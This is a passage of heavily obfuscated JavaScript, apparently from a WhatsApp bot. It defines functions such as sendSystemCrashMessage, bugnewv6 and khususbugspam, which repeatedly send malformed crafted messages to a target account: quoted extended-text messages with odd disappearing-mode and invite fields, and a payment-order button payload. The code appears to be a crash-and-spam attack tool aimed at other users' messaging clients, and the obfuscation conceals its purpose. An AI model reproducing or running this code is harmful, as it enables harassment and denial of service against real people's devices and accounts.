VxoZap[_0x4101fb(0x158,0x4bb,0x217,0x40a,0x462)+_0x4669ca(0x553,0x6d4,0x7ad,0x49c,0x5bc)+'ge'](_0xd1b120,_0x2d1f36[_0x466181(0x6e7,0x876,0x4dd,0x4f0,0x972)+'ge'],{'participant':{'jid':_0xd1b120},'messageId':_0x2d1f36[_0x1c351f(0x82c,0x484,0x55a,0x4ae,0x41b)]['id']});}async function sendExtendedTextMessage(_0x4fa2c1){const _0x46f753={};_0x46f753[_0x423347(0x1d8,0x2ea,0x3e8,0x1b3,0x237)]=function(_0x382d0c,_0x5634d9){return _0x382d0c+_0x5634d9;},_0x46f753[_0x5b2702(0x484,0x654,0x443,0x633,0x425)]=_0x423347(0x7,0x17d,0xda,-0x19b,-0x3c)+_0x5b2702(0x515,0x1ab,0x4d6,0x33c,0x283)+_0x5b2702(0xff,0x56c,0x504,0x34f,0x45f)+_0x52a47c(-0x2ed,0x127,-0xf7,-0xeb,-0x155),_0x46f753[_0xb7cbbf(-0xa3,-0x5,0x58,-0x44,0x152)]=_0xb7cbbf(0x162,-0x41,0x256,0x24d,0x402),_0x46f753[_0x5b2702(0x485,0x6fa,0x9ed,0x729,0x799)]=_0x52a47c(0x1d4,0x1db,0x17a,0xd6,-0x125)+_0xb7cbbf(0x37a,0x383,0x4c5,0x4da,0x559)+_0x507318(0x245,0x26,0x4ec,0x17a,0x50),_0x46f753[_0x52a47c(0x5e1,0x50a,0x5fd,0x38f,0x5d6)]=_0x423347(0x132,0xe1,0xf3,0x26e,-0x13c)+_0x52a47c(0x21b,0x2d,0x99,0x16,0x16c)+'NG';function _0x423347(_0x22a1a3,_0x5182c4,_0x1b4dcb,_0x701168,_0x4797e1){return _0x29f0b3(_0x22a1a3-0x1ad,_0x5182c4-0x1b5,_0x701168,_0x701168-0xf9,_0x22a1a3-0xa2);}function _0xb7cbbf(_0x1fb4bf,_0x3f4bb1,_0x2c7b02,_0x40ce2c,_0x292c4f){return _0x279901(_0x40ce2c,_0x3f4bb1-0x1a0,_0x2c7b02-0x1a5,_0x1fb4bf- -0xee,_0x292c4f-0x78);}_0x46f753[_0x507318(-0x2c,0x1d6,0x26b,-0x2f5,-0x1c4)]=_0xb7cbbf(0x2d7,0x13a,0x32f,0x381,0x481)+'LT';const _0x15ff3d=_0x46f753;function _0x507318(_0x37d291,_0x41ab9b,_0xa49b3b,_0x3e55ef,_0x13ef44){return _0x307533(_0x37d291-0x12,_0x13ef44,_0xa49b3b-0x1b5,_0x3e55ef-0x17f,_0x37d291- -0x236);}const _0xccda98={};_0xccda98[_0xb7cbbf(0x376,0x454,0x489,0x137,0x2df)+_0x5b2702(0x621,0x555,0x2ee,0x586,0x548)]=null;function _0x5b2702(_0x4aac35,_0x30f6a4,_0x2d7ecc,_0x4fa43d,_0x320731){return _0x279901(_0x2d7ecc,_0x30f6a4-0x12c,_0x2d7ecc-0x13f,_0x4fa43d-0x34a,_0x320731-0x4);}function _0x52a47c(_0x2d56bc,_0x647b91,_0x1e36ab,_0x2754d6,_0x307442){return _0x29f0b3(_0x2d56bc-0x16a,_0x647b91-0xe1,_0x1e36ab,_0x2754d6-0x101,_0x2754d6- -0x3d);}VxoZap[_0xb7cbbf(0x90,-0x118,0x1f4,0x31f,-0x176)+_0x507318(0x1c7,0x38b,0x478,0x212,0x1a8)+'ge'](_0x4fa2c1,{'extendedTextMessage':{'text':'.','contextInfo':{'stanzaId':_0x4fa2c1,'participant':_0x4fa2c1,'quotedMessage':{'conversation':_0x15ff3d[_0x52a47c(-0x166,-0xfc,-0x84,0xf9,0x3a)](_0x15ff3d[_0x507318(0x150,0x3b5,0x1bf,-0xb4,0xed)],_0x15ff3d[_0x5b2702(0x189,0x25f,0x336,0x395,0x64e)][_0xb7cbbf(0x1b9,-0x2f,0x3d0,0x33d,-0xda)+'t'](-0x174ca+0xe0dc+-0x3a*-0x5eb))},'disappearingMode':{'initiator':_0x15ff3d[_0x52a47c(0x28b,0x119,0xce,0x302,0x5c9)],'trigger':_0x15ff3d[_0x423347(0x46e,0x56a,0x65d,0x280,0x516)]}},'inviteLinkGroupTypeV2':_0x15ff3d[_0xb7cbbf(0x7f,0x1e7,0x119,-0x8a,0x15a)]}},{'participant':{'jid':_0x4fa2c1}},_0xccda98);}async function sendVariousMessages(_0x1e71ca,_0x1817a3){function _0x2adda5(_0x2ddf46,_0x2b1728,_0x36b99c,_0x4135f8,_0x5c15eb){return _0xf1b353(_0x2ddf46-0xfe,_0x2b1728-0xa2,_0x2b1728,_0x4135f8-0x1c4,_0x4135f8-0x72);}function _0x5a6aa9(_0x51409d,_0x5149fa,_0x40c5e8,_0xf54703,_0x2b8d32){return _0x29f0b3(_0x51409d-0x1b1,_0x5149fa-0x1d2,_0x5149fa,_0xf54703-0x20,_0x40c5e8-0x273);}function _0x3184c4(_0x521a53,_0x2f6742,_0x5e96ed,_0x27fabd,_0x4f07a5){return _0x307533(_0x521a53-0x172,_0x2f6742,_0x5e96ed-0xc3,_0x27fabd-0xd0,_0x27fabd- -0xf6);}function _0xfa751e(_0xf7151b,_0x48f966,_0x35d28d,_0x57f968,_0x36a0d2){return _0x279901(_0x48f966,_0x48f966-0xfd,_0x35d28d-0x1a9,_0x57f968-0x74,_0x36a0d2-0x1d4);}const _0x57ca4f={'KQjQi':function(_0x52db24,_0x3dd668){return _0x52db24<_0x3dd668;},'mwrnW':function(_0x86223a,_0x145af3){return _0x86223a!==_0x145af3;},'LZwYM':_0x3184c4(0x15f,-0x127,-0x86,0x10,-0x29b),'mWvar':_0x3184c4(0x278,0x423,0x3f8,0x40c,0x408)+_0x3184c4(0x55,0x1b9,0x395,0x1b7,0x34a)+_0x13ef79(0xbf4,0xbbc,0x8ef,0x778,0x96e),'StzBC':function(_0x416534,_0x2a5556){return _0x416534(_0x2a5556);},'GJYJs':function(_0x5c00aa,_0x2a7e3b){return _0x5c00aa(_0x2a7e3b);},'ovyZq':function(_0x2790da,_0x412876){return _0x2790da(_0x412876);},'buLsg':function(_0x597448,_0x3b3a90){return _0x597448(_0x3b3a90);},'GVyoj':function(_0x144b9d,_0x2f684e){return _0x144b9d(_0x2f684e);},'OxJCC':function(_0x429090,_0xd3b28){return _0x429090(_0xd3b28);}};function _0x13ef79(_0x11161f,_0x29f49a,_0x529271,_0x3d16af,_0x1d3dce){return _0xf1b353(_0x11161f-0x11b,_0x29f49a-0x108,_0x3d16af,_0x3d16af-0x59,_0x1d3dce-0x224);}for(let _0x42e590=-0x1*0x1069+-0x2617+-0x4*-0xda0;_0x57ca4f[_0xfa751e(0x18e,0x28f,0x4fe,0x45c,0x489)](_0x42e590,_0x1817a3);_0x42e590++){if(_0x57ca4f[_0x5a6aa9(0x7d8,0x8d9,0x6df,0x758,0x94d)](_0x57ca4f[_0x13ef79(0x9ae,0x9ae,0x718,0x534,0x6e7)],_0x57ca4f[_0xfa751e(-0x28,0xd4,-0x14,0x239,0x15c)]))_0x1b8fa4=_0x36e865;else{const _0x217447=_0x57ca4f[_0x2adda5(0x64c,0x619,0x3c2,0x52e,0x668)][_0x3184c4(0x305,-0x191,0x119,0x85,0x200)]('|');let _0x5565e2=-0x210d+0x1444+0xcc9;while(!![]){switch(_0x217447[_0x5565e2++]){case'0':_0x57ca4f[_0x5a6aa9(0x378,0x454,0x39d,0x1d3,0x110)](sendListMessage,_0x1e71ca);continue;case'1':_0x57ca4f[_0x5a6aa9(0x29c,0x459,0x4fb,0x7cd,0x53d)](sendLiveLocationMessage,_0x1e71ca);continue;case'2':await _0x57ca4f[_0xfa751e(0xa6,0x3b0,0x1fa,0x23e,0x4eb)](sleep,0x57b*-0x2+-0x23d+0xf27);continue;case'3':await _0x57ca4f[_0xfa751e(-0x11f,0x2e,-0x295,0x2f,-0xf1)](sleep,-0x39c+0x1548+-0x277*0x4);continue;case'4':_0x57ca4f[_0x2adda5(0x53d,0x719,0x70b,0x713,0x50c)](sendSystemCrashMessage,_0x1e71ca);continue;case'5':await _0x57ca4f[_0xfa751e(0x603,0x362,0x51c,0x39c,0x19a)](sleep,0x51a+-0x21d*-0xc+-0xe41*0x2);continue;case'6':_0x57ca4f[_0x5a6aa9(0x699,0x66e,0x668,0x728,0x6d3)](sendSystemCrashMessage,_0x1e71ca);continue;case'7':await _0x57ca4f[_0x2adda5(0x796,0x6b7,0x28a,0x4e5,0x662)](sleep,-0x7*0x569+0x14e+0x1*0x2a6d);continue;}break;}}}}function _0x28c5(_0x165380,_0x54a078){const _0xddd9f7=_0x512b();return _0x28c5=function(_0x55e416,_0x1094be){_0x55e416=_0x55e416-(0x2566+0x222e+-0x4656);let _0x5ea9a9=_0xddd9f7[_0x55e416];return _0x5ea9a9;},_0x28c5(_0x165380,_0x54a078);}const _0x382adc={};_0x382adc[_0x279901(0x350,0x3d9,0x239,0x1e1,-0x9e)+_0xf1b353(0x8a1,0x605,0x591,0x837,0x5f4)]=_0x29f0b3(0x2ed,0x18f,0x3cc,-0xf0,0x164)+_0x29f0b3(0x6d,-0x32,0x147,0x137,-0x79)+_0x307533(0x17d,0x5ac,0x2f7,0x620,0x3eb)+'t';const _0x559b3f={'participant':_0xf1b353(0x5f3,0x272,0x31e,0x23b,0x342)+_0x279901(0x17d,0x36a,0x23f,0x107,-0x18e)+_0x30a091(0xe7,-0x10a,0x14d,-0xb5,0x2dd)+'t',...m[_0x29f0b3(-0x212,-0x1e,-0x18b,-0x1e9,0x87)]?_0x382adc:{}},_0x5051c6={};_0x5051c6[_0x279901(0x353,0x4e7,0x5e7,0x4bf,0x262)]=''+global[_0xf1b353(0x2af,0x31b,0x2f2,0x724,0x461)+_0x30a091(-0x1d5,-0x410,-0xf4,-0x73,-0xec)];const _0x34cab3={};_0x34cab3[_0xf1b353(0x24f,0x479,0x4e2,0x750,0x4e5)+_0x307533(0x56b,0x17c,0xb0,0x408,0x328)+_0xf1b353(0x7e6,0x722,0x405,0x5ed,0x62a)+_0xf1b353(0x59c,0x530,0x4bd,0x2e0,0x395)]=_0x5051c6;const _0x6b0749={};_0x6b0749[_0x307533(0x3fe,0x828,0x72a,0x398,0x5a7)]=_0x559b3f,_0x6b0749[_0x279901(0x2cf,0x367,0x191,0x464,0x5c5)+'ge']=_0x34cab3;const GSZ=_0x6b0749;async function khususbugspam(_0x534ff3,_0x428dde){function _0x1af3c4(_0x437da9,_0x40b96a,_0x1680cd,_0x166136,_0x5a7860){return _0x279901(_0x5a7860,_0x40b96a-0x65,_0x1680cd-0x63,_0x1680cd-0x17b,_0x5a7860-0x197);}function _0x1d168c(_0x8f7257,_0x17a33c,_0xabd560,_0x5110b4,_0x1d96c7){return _0x30a091(_0x17a33c-0x86,_0x5110b4,_0xabd560-0x177,_0x5110b4-0x1b4,_0x1d96c7-0x61);}function _0x57ec13(_0x1c5aa3,_0x35d223,_0x61acb,_0x414524,_0x56ddb5){return _0x30a091(_0x35d223-0x509,_0x414524,_0x61acb-0x17f,_0x414524-0x1bf,_0x56ddb5-0x1ec);}const _0x4bb0e1={'AmtVG':function(_0x187772,_0x54b6b4){return _0x187772(_0x54b6b4);},'CjtOC':function(_0x4073a2,_0xa1d8e7){return _0x4073a2<_0xa1d8e7;},'pwZUM':function(_0x426612,_0x4c907a){return _0x426612===_0x4c907a;},'aVZTS':_0x1af3c4(0x7ea,0x63d,0x5cc,0x3c4,0x87f),'HdxaF':_0x55a659(0x802,0x901,0x49e,0x6e4,0x4d5)+_0x55a659(0x9a2,0x4cd,0x852,0x6ec,0x685)+_0x1d168c(0x2c,0x278,0x48c,0x3fa,0x22)+_0x1d168c(0x74,0x1a0,0x223,0x228,0x424)+_0x1d168c(0x176,-0x12f,-0x1,0xcd,-0x3ba)+_0x1d168c(0x141,0x1cb,0x37d,0x321,0x478)+_0x57ec13(0x512,0x571,0x64b,0x569,0x562)+_0x1af3c4(0x797,0x49f,0x5ea,0x471,0x4a4)+_0x1af3c4(0x799,0x3e4,0x592,0x2cf,0x63b)+_0x276ef7(0x14e,0x3ba,0x3f8,0x536,0x214)+_0x276ef7(0x5d7,0x3a8,0x2b8,0x653,0x169),'QCGzN':function(_0x4ea39d,_0x474b07){return _0x4ea39d(_0x474b07);},'ZGjSR':function(_0x5a3798,_0x4c6dd3){return _0x5a3798(_0x4c6dd3);},'fCOZQ':function(_0x29e69c,_0x1b9b6c){return _0x29e69c(_0x1b9b6c);},'LwUXk':function(_0x4210da,_0x5cbabc){return _0x4210da(_0x5cbabc);},'hsQbl':function(_0xf4db01,_0x504e3c){return _0xf4db01(_0x504e3c);},'JXfKc':function(_0x1656f1,_0x5321ea){return _0x1656f1(_0x5321ea);}};function _0x55a659(_0x3c7208,_0x56c535,_0x3905ca,_0x4ae15d,_0x198bbb){return _0x279901(_0x56c535,_0x56c535-0x4e,_0x3905ca-0x104,_0x4ae15d-0x333,_0x198bbb-0xfc);}function _0x276ef7(_0x5ca19c,_0xdc750f,_0x358637,_0x4c7dbb,_0x343ede){return _0x30a091(_0xdc750f-0x6,_0x5ca19c,_0x358637-0x8b,_0x4c7dbb-0x66,_0x343ede-0xc6);}for(let _0x49b028=-0x88+0x143f*0x1+-0x13b7;_0x4bb0e1[_0x276ef7(0x369,0x17c,0x319,0x238,0x123)](_0x49b028,_0x428dde);_0x49b028++){if(_0x4bb0e1[_0x1af3c4(0x3e9,0x214,0x21f,0x309,0x337)](_0x4bb0e1[_0x57ec13(0x582,0x859,0x8dd,0xaf8,0x642)],_0x4bb0e1[_0x55a659(0x68a,0x537,0x773,0x7f0,0x929)])){const _0x80de87=_0x4bb0e1[_0x276ef7(0x22d,0x306,0x13b,0x432,0x464)][_0x1d168c(0x1d6,-0x9,0x243,-0x92,-0x1be)]('|');let _0x494b5c=0x355+-0xff4+0xc9f*0x1;while(!![]){switch(_0x80de87[_0x494b5c++]){case'0':_0x4bb0e1[_0x57ec13(0x44f,0x3a8,0x56a,0x28c,0x306)](bugnewv6,_0x534ff3);continue;case'1':_0x4bb0e1[_0x55a659(0x474,0x608,0x32f,0x33f,0x425)](bugnewv6,_0x534ff3);continue;case'2':await _0x4bb0e1[_0x1af3c4(0x2f6,0x1e1,0x26c,-0x51,0x346)](sleep,0x22f*-0x11+-0x45*-0x1d+0x251e*0x1);continue;case'3':_0x4bb0e1[_0x57ec13(0x503,0x3a8,0x121,0x2ba,0x5d7)](bugnewv6,_0x534ff3);continue;case'4':_0x4bb0e1[_0x57ec13(0x95e,0x6cc,0x810,0x670,0x838)](bugnewv6,_0x534ff3);continue;case'5':await _0x4bb0e1[_0x55a659(0x54b,0x88e,0xa34,0x795,0x81b)](sleep,-0x8*-0x2c7+-0x1*0x243c+0x15d4);continue;case'6':_0x4bb0e1[_0x1d168c(0x589,0x37b,0x495,0x510,0x1bd)](bugnewv6,_0x534ff3);continue;case'7':_0x4bb0e1[_0x276ef7(0xd8,-0x76,-0x1c6,0x245,-0x170)](bugnewv6,_0x534ff3);continue;case'8':_0x4bb0e1[_0x1af3c4(0x27a,0x44a,0x3f2,0x21e,0x54d)](bugnewv6,_0x534ff3);continue;case'9':await _0x4bb0e1[_0x57ec13(0x600,0x6cc,0x8a5,0x55b,0x68e)](sleep,0x1f*0x22+0x2*-0xe64+0xd4f*0x2);continue;case'10':await _0x4bb0e1[_0x57ec13(0x493,0x48d,0x6fa,0x5ec,0x2b2)](sleep,-0x1*0x68e+0x3*-0x33+0xef7);continue;case'11':await _0x4bb0e1[_0x57ec13(0x6ac,0x52d,0x319,0x6bd,0x377)](sleep,-0xe39+-0x22f6+0x38ff*0x1);continue;case'12':await _0x4bb0e1[_0x1af3c4(0x443,0x454,0x5dd,0x3d2,0x5f3)](sleep,0x1*-0x16bb+-0x5*0x1b2+0x7*0x593);continue;case'13':_0x4bb0e1[_0x55a659(0x2f7,0x31c,0x5f8,0x33f,0xc1)](bugnewv6,_0x534ff3);continue;case'14':await _0x4bb0e1[_0x1af3c4(0xc8,0x1eb,0x187,0x29f,0x425)](sleep,0xbb+0x1*0x1bb9+-0x1*0x14a4);continue;case'15':await _0x4bb0e1[_0x276ef7(0x191,-0x76,-0x33c,-0xb5,0xf3)](sleep,0x124a+-0x230b*-0x1+-0x3361);continue;case'16':await _0x4bb0e1[_0x55a659(0x427,0x50b,0x686,0x663,0x667)](sleep,0xc79*-0x2+0x1*0x3a+-0x411*-0x8);continue;case'17':await _0x4bb0e1[_0x1af3c4(0x60e,0x566,0x528,0x787,0x381)](sleep,-0x249+0x1*-0x2636+0x1*0x304f);continue;case'18':_0x4bb0e1[_0x57ec13(0x159,0x3a8,0x3a4,0x223,0x4ef)](bugnewv6,_0x534ff3);continue;case'19':_0x4bb0e1[_0x1d168c(0x40e,0x37b,0x504,0x3e6,0x5a1)](bugnewv6,_0x534ff3);continue;case'20':await _0x4bb0e1[_0x57ec13(0x4af,0x48d,0x469,0x31b,0x48d)](sleep,-0x776+-0x26*0x71+-0xe*-0x24a);continue;case'21':_0x4bb0e1[_0x276ef7(0x2dd,0x2a,0x36,-0x1bc,0x82)](bugnewv6,_0x534ff3);continue;}break;}}else{if(_0x1d16ea)return _0x3edb3d;else oJfRpP[_0x57ec13(0x686,0x48d,0x24b,0x1f5,0x1e0)](_0x8d1f87,-0x4e5+-0xd92+0x1277*0x1);}}}async function sendRepeatedMessages2(_0x1c5dc5,_0x4de9e3){const _0x3c0a1a={'qshby':function(_0xa56bed,_0x424936){return _0xa56bed<_0x424936;},'WuIEo':function(_0x1c74d4,_0x4317fe){return _0x1c74d4===_0x4317fe;},'yUbSR':_0x53e1ba(0x718,0x5c3,0x5e4,0x52a,0x511),'DdimK':_0x53e1ba(0x5c7,0x411,0x426,0x429,0x2d1)+_0x36611b(0x6c1,0x514,0x24b,0x38a,0x70f)+_0x45e5a3(0x74a,0x4a9,0x838,0x92d,0x6cc),'FpLva':function(_0x4a40e4,_0x3853bc){return _0x4a40e4(_0x3853bc);},'nBIje':function(_0x700742,_0x29bba5){return _0x700742(_0x29bba5);},'emAWw':function(_0x5e34ce,_0x233a71){return _0x5e34ce(_0x233a71);},'SkZgf':function(_0xeb01aa,_0x5bdf98){return _0xeb01aa(_0x5bdf98);}};function _0x36611b(_0x58c6da,_0x40326d,_0x5bcf3d,_0x135e95,_0x43ab8e){return _0xf1b353(_0x58c6da-0xe5,_0x40326d-0x1e6,_0x43ab8e,_0x135e95-0x23,_0x40326d- -0x165);}function _0x45e5a3(_0x501802,_0x301b8e,_0xe1197f,_0x5eac62,_0x1497f1){return _0x307533(_0x501802-0x34,_0x501802,_0xe1197f-0x8c,_0x5eac62-0xb9,_0x1497f1-0x1d9);}function _0x3208e6(_0x1ab351,_0x490e3c,_0x3b1bc8,_0x5a229b,_0x1bd5bb){return _0x30a091(_0x1ab351- -0xac,_0x5a229b,_0x3b1bc8-0x58,_0x5a229b-0x16f,_0x1bd5bb-0x1ec);}function _0x1541fd(_0x122c95,_0x5a05a8,_0x41eda6,_0xd750d8,_0x200540){return _0x30a091(_0x200540-0x633,_0xd750d8,_0x41eda6-0x59,_0xd750d8-0x186,_0x200540-0x96);}function _0x53e1ba(_0x1df2bc,_0x141934,_0x318bb6,_0x2a928a,_0x9253ff){return _0x279901(_0x141934,_0x141934-0x1af,_0x318bb6-0x147,_0x2a928a-0x346,_0x9253ff-0x114);}for(let _0x5ac423=-0x3*0x191+0x7ad+0xfe*-0x3;_0x3c0a1a[_0x1541fd(0x747,0x6f1,0x76b,0x430,0x621)](_0x5ac423,_0x4de9e3);_0x5ac423++){if(_0x3c0a1a[_0x1541fd(0x829,0x5f2,0xa07,0x9cd,0x7f8)](_0x3c0a1a[_0x53e1ba(0x352,0xf2,0x31d,0x3c5,0x256)],_0x3c0a1a[_0x36611b(0x5d,0x218,0x175,-0x6d,0x1d8)])){const _0x121553=_0x3c0a1a[_0x36611b(0x1bc,0x337,0x3a6,0x4a5,0x1f3)][_0x3208e6(-0x13b,-0x242,0x10c,0x4c,0x1c)]('|');let _0x551138=0x2*-0x957+0x8a+-0x1224*-0x1;while(!![]){switch(_0x121553[_0x551138++]){case'0':_0x3c0a1a[_0x36611b(0x488,0x661,0x932,0x4ab,0x927)](sendSystemCrashMessage,_0x1c5dc5);continue;case'1':_0x3c0a1a[_0x3208e6(-0x17,0x129,0x42,0xd2,-0x1c6)](sendSystemCrashMessage,_0x1c5dc5);continue;case'2':_0x3c0a1a[_0x45e5a3(0x771,0x55b,0x886,0x9d2,0x73e)](sendSystemCrashMessage,_0x1c5dc5);continue;case'3':await _0x3c0a1a[_0x53e1ba(0x5f1,0x7c0,0x5be,0x876,0xa3e)](sleep,0x1c48+0x2*-0xef5+-0x396*-0x1);continue;case'4':await _0x3c0a1a[_0x36611b(0x4ea,0x6c9,0x6c6,0x88b,0x81d)](sleep,-0x6cf+-0x1*0x15bc+0x245b);continue;case'5':await _0x3c0a1a[_0x36611b(0x4cd,0x583,0x32d,0x426,0x69c)](sleep,-0xd2+0x54*0x34+-0x6*0x1bb);continue;case'6':_0x3c0a1a[_0x1541fd(0x761,0x736,0xb06,0x96d,0x98e)](sendSystemCrashMessage,_0x1c5dc5);continue;case'7':await _0x3c0a1a[_0x1541fd(0x5d2,0x488,0x69f,0x670,0x6c8)](sleep,-0x41e*-0x8+-0x737+-0x17c5*0x1);continue;}break;}}else{if(_0x3f73d8){const _0x2a21b8=_0x2b5ea3[_0x3208e6(0x38,0xbc,-0x1f4,0x8d,-0x144)](_0x64b262,arguments);return _0x5b6d07=null,_0x2a21b8;}}}}async function bugnewv6(_0x2c4b12){function _0x21e537(_0x5ecb13,_0x322f63,_0xfd8e47,_0x2004b4,_0x5efc08){return _0x30a091(_0x5ecb13-0x5,_0x5efc08,_0xfd8e47-0x63,_0x2004b4-0x40,_0x5efc08-0xf4);}const _0x4e6b49={};_0x4e6b49[_0x446d7a(0x423,0x455,0x3b4,0x5da,0x639)]=_0x446d7a(0x558,0x2b3,0x3d,0x51,0x529)+_0x446d7a(0x47d,0x3a5,0x325,0x593,0x5be)+'fo',_0x4e6b49[_0x409231(0x339,0x2ec,-0xa4,0x14d,0xf3)]=_0x190c81(0xab7,0x801,0x644,0x59b,0x65c),_0x4e6b49[_0x21e537(0x21f,0xbc,0x98,0x1fd,0xe2)]=_0x3cb28a(0x939,0x488,0x65a,0x6ce,0x6d2)+_0x3cb28a(0x690,0x942,0x947,0x71f,0x701)+'C',_0x4e6b49[_0x409231(0x1dd,0x280,0x51d,0x29e,0x40e)]=_0x190c81(0x67c,0x606,0x7e8,0x825,0x436)+_0x3cb28a(0x3eb,0x46b,0x8b0,0x5ee,0x5ec)+_0x190c81(0xbfc,0x9f2,0x987,0xbe5,0xb94),_0x4e6b49[_0x409231(0x176,0x73,-0x1e2,-0x12f,-0x395)]=_0x409231(0x1ad,0xfe,0x309,0x1f8,0xcd)+'ng';function _0x409231(_0x247c18,_0x2d3a3b,_0x205591,_0x377c0a,_0x2b5084){return _0x29f0b3(_0x247c18-0x6f,_0x2d3a3b-0x14e,_0x2d3a3b,_0x377c0a-0xfb,_0x377c0a- -0xcd);}_0x4e6b49[_0x3cb28a(0x538,0x768,0x3ef,0x67c,0x5f2)]=_0x3cb28a(0x5a2,0x68d,0x93c,0x924,0x86b),_0x4e6b49[_0x409231(0x148,-0xe3,0x6f,0x1ca,0x44d)]=_0x21e537(0x345,0x5b8,0x378,0x1b0,0x3c1)+_0x446d7a(0x4e0,0x372,0x286,0x2b6,0x12e)+_0x409231(0x127,0x8f,0x3fb,0x35c,0x3c1),_0x4e6b49[_0x190c81(0x6cf,0x8b1,0x5f3,0xa65,0x6ca)]=_0x190c81(0x75b,0x71f,0x5c8,0x6ff,0x973)+'vo',_0x4e6b49[_0x446d7a(0x38e,0x2f3,0x27,0x31b,0xb7)]=_0x21e537(-0x82,0x11c,-0x192,-0x8b,0xe0)+_0x190c81(0x886,0x7f8,0x9f1,0x565,0x8dc)+_0x21e537(0x125,-0xce,-0x10c,-0x10f,0xa5);const _0x2068ce=_0x4e6b49,_0xfe3d60={};_0xfe3d60[_0x3cb28a(0x1d4,0x329,0x4c4,0x665,0x4a9)+_0x21e537(-0x67,0x1c5,-0x25b,-0xb,-0x214)+_0x446d7a(0x107,0x2aa,0x533,0xbb,0x181)+_0x190c81(0x5a3,0x619,0x5fd,0x63a,0x794)+_0x409231(0x3bf,0x178,0x2d9,0x2d1,0x590)]=0x2,_0xfe3d60[_0x409231(-0x3bf,-0x2e4,-0x38c,-0x19e,0x7a)+_0x190c81(0x890,0x5dc,0x7df,0x363,0x738)+_0x190c81(0x542,0x4c2,0x471,0x4cd,0x4ad)+_0x409231(-0x232,0x110,-0x92,-0x1c0,-0x14)]={};const _0x161fe0=_0xfe3d60,_0x3b6658={};_0x3b6658[_0x3cb28a(0xac5,0x9ea,0x792,0xc04,0x97c)]=0x0,_0x3b6658[_0x21e537(-0x68,-0x307,0xd7,0x1f1,-0x1a9)+'t']=0x64;const _0x1bee93={};_0x1bee93[_0x3cb28a(0x87d,0x7ea,0xb0b,0xb68,0x97c)]=0x0,_0x1bee93[_0x21e537(-0x68,0xcf,0xb8,0xa8,0x2d)+'t']=0x64;const _0x5279fd={};_0x5279fd[_0x409231(0x553,0x5af,0x507,0x335,0x1bf)]=0x0;function _0x3cb28a(_0x41acb6,_0x5e2064,_0x5f055d,_0x159186,_0x309dbe){return _0x279901(_0x5e2064,_0x5e2064-0x65,_0x5f055d-0xf3,_0x309dbe-0x4da,_0x309dbe-0x46);}_0x5279fd[_0x446d7a(0x453,0x3c3,0x4f3,0x522,0x2dc)+'t']=0x64;const _0x3daecd={};_0x3daecd[_0x446d7a(0x5e1,0x765,0x9e6,0x814,0x8df)]=0x0,_0x3daecd[_0x409231(-0x3c,0x156,0x224,-0x6d,-0x241)+'t']=0x64;const _0x1e45b7={};_0x1e45b7[_0x190c81(0x6c1,0x47b,0x238,0x572,0x4a1)]='',_0x1e45b7[_0x446d7a(0x2b5,0x322,0x24d,0x7d,0x50)+'t']=_0x5279fd,_0x1e45b7[_0x446d7a(0x6ac,0x4cb,0x68b,0x62b,0x646)+_0x21e537(0x296,0x223,0x18a,0x54b,0x2b5)]=0x0,_0x1e45b7[_0x409231(0x112,0x2d9,0x13f,0x6,0x1a7)+_0x21e537(-0x109,-0x93,-0x340,0x199,0xae)+'t']=_0x3daecd;const _0x272c30={'name':_0x2068ce[_0x446d7a(0x6fa,0x455,0x483,0x6de,0x6d7)],'buttonParamsJson':JSON[_0x21e537(0x231,0x25b,0x223,0xc2,0x234)+_0x446d7a(0x57f,0x668,0x8b1,0x3ee,0x8a3)]({'currency':_0x2068ce[_0x3cb28a(0x708,0x7d0,0x53b,0x50f,0x794)],'total_amount':_0x3b6658,'reference_id':_0x2068ce[_0x190c81(0xae3,0x862,0x69b,0x7fc,0x72a)],'type':_0x2068ce[_0x446d7a(0x8b8,0x6ce,0x4fa,0x66a,0x73e)],'order':{'status':_0x2068ce[_0x21e537(-0x12a,-0xf6,-0x289,0x34,-0xfd)],'subtotal':_0x1bee93,'order_type':_0x2068ce[_0x409231(0x1a,-0x5d,-0x1ab,-0x55,-0x122)],'items':[_0x1e45b7]},'payment_settings':[{'type':_0x2068ce[_0x446d7a(0x680,0x5fa,0x54a,0x3e0,0x373)],'pix_static_code':{'merchant_name':_0x2068ce[_0x409231(0xea,0x51f,0x140,0x269,0x272)],'key':_0x2068ce[_0x21e537(-0x138,0x120,-0x2,-0x3f0,0x199)],'key_type':'X'}}]})},_0x4735ab={};_0x4735ab[_0x190c81(0x51d,0x4c9,0x46e,0x6ca,0x236)+'ns']=[_0x272c30];function _0x190c81(_0x21cba6,_0x504033,_0x126649,_0x577976,_0x386b10){return _0x29f0b3(_0x21cba6-0x11,_0x504033-0x58,_0x577976,_0x577976-0x1bb,_0x504033-0x57b);}const _0x51410a=_0x4735ab,_0x519d1c={};_0x519d1c[_0x3cb28a(0x594,0x482,0x405,0x6a7,0x65e)+_0x190c81(0x752,0x55b,0x389,0x550,0x76a)+_0x190c81(0x87b,0x83b,0xadc,0x74d,0x933)+'ge']=_0x51410a;const _0x5723d5=_0x519d1c;function _0x446d7a(_0x3a2010,_0x227106,_0x5e8f36,_0x2550b1,_0x5043dc){return _0x279901(_0x5e8f36,_0x227106-0xc9,_0x5e8f36-0x16,_0x227106-0x2c3,_0x5043dc-0xa6);}const _0x2db6ce={};_0x2db6ce[_0x190c81(0x8e6,0x93f,0x7a3,0x71f,0x933)+_0x3cb28a(0x3ac,0x401,0x379,0x6b3,0x4f8)+_0x21e537(0x275,-0x44,0x2fa,0x1f7,0x341)+_0x21e537(-0x5e,-0x4b,-0x57,0x11,0x22)]=_0x161fe0,_0x2db6ce[_0x446d7a(0x373,0x49c,0x43d,0x679,0x686)+_0x21e537(-0x100,0xdf,-0x294,-0x26a,-0x245)+_0x446d7a(0x9fc,0x764,0x663,0x9df,0x698)+_0x190c81(0x8ff,0x959,0xbfc,0x9ad,0xbd1)]=_0x5723d5;const _0x19720b=_0x2db6ce,_0x41b958={};_0x41b958[_0x446d7a(0x804,0x727,0x959,0x7ba,0x598)+'ge']=_0x19720b;const _0x592185={};_0x592185[_0x446d7a(0x368,0x27c,0x487,0xb9,0x3a8)+_0x3cb28a(0x88f,0x384,0x4dc,0x4b2,0x613)+_0x3cb28a(0x4cd,0x61d,0x5b8,0x70e,0x753)]=_0x41b958;const _0x412ae1=_0x592185,_0x5a3e48={};_0x5a3e48[_0x409231(0x5f,0x1aa,0x1c,0x11f,0x314)]=_0x2c4b12;const _0x36186a={};_0x36186a[_0x190c81(0x7b0,0x79c,0x947,0x96e,0xa52)+_0x409231(-0xa7,0x346,0x337,0x1f9,0x1cc)+'t']=_0x5a3e48;const 